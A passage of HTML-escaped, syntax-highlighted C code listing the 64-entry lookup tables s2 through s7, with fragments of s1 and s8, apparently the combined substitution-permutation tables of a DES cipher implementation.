number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s3<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s4<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s5<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s6<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s7<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s8<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token 